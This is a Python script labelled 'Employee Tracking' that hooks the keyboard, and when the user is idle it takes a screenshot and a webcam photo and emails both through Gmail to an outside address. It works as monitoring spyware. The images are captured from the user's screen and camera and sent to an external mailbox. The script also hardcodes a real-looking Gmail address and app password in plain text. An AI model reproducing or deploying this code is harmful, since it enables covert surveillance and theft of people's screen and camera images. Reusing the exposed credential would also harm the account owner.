import email
from email.mime.base import MIMEBase
from pynput import keyboard
from plyer import notification
import threading
import time
import cv2
import numpy as np
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

idle_time = 0

def show_toast(title, message, duration=5):
    notification.notify(
        title=title,
        message=message,
        timeout=duration,
    )

def on_press(key):
    global idle_time
    idle_time = 0  # Reset 
    try:
        print(f'Key {key.char} pressed')
    except AttributeError:
        print(f'Special Key {key} pressed')

def check_idle():
    global idle_time
    while True:
        if idle_time >= 10:
            print("Idle")
            title = "Employee Tracking"
            message = "Focus on your work please, you are being recorded."
            show_toast(title, message)
            idle_time = 0
            take_screenshot_and_camera()
            send_email_with_screenshot()
        else:
            time.sleep(1)
            idle_time += 1

def take_screenshot_and_camera():
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png')  

    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('camera_image.png', frame)  
    cap.release()

def send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password):
    
    email_body = MIMEMultipart()
    email_body.attach(MIMEText(message, 'plain'))

    email_body['Subject'] = subject
    email_body['From'] = from_email
    email_body['To'] = to_email

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, email_body.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print("Failed to send email. Error:", str(e))
    finally:
        server.quit()

def send_email_with_screenshot():
    subject = "Suspicious Activity Detected"
    message = "Please check the attached screenshot and camera image for details."
    from_email = "abilalcybex@gmail.com"
    to_email = "i.l3br3l@gmail.com"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "abilalcybex@gmail.com"
    smtp_password = "fgfk iejq xkpa dsvw"
    send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password)
    attach_files_to_email()

def attach_files_to_email():
    subject = "Suspicious Activity Detected"
    from_email = "abilalcybex@gmail.com"
    to_email = "i.l3br3l@gmail.com"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "abilalcybex@gmail.com"
    smtp_password = "fgfk iejq xkpa dsvw"
    email_body = MIMEMultipart()
    email_body.attach(MIMEText("Please check the attached screenshot and camera image for details.", 'plain'))
    email_body['Subject'] = subject
    email_body['From'] = from_email
    email_body['To'] = to_email

    for filename in ['screenshot.png', 'camera_image.png']:
        with open(filename, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
        email_body.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, email_body.as_string())
        print("Email with screenshot and camera image sent successfully!")
    except Exception as e:
        print("Failed to send email with screenshot and camera image. Error:", str(e))
    finally:
        server.quit()

listener = keyboard.Listener(on_press=on_press)
listener.start()
idle_thread = threading.Thread(target=check_idle)
idle_thread.daemon = True
idle_thread.start()
listener.join()
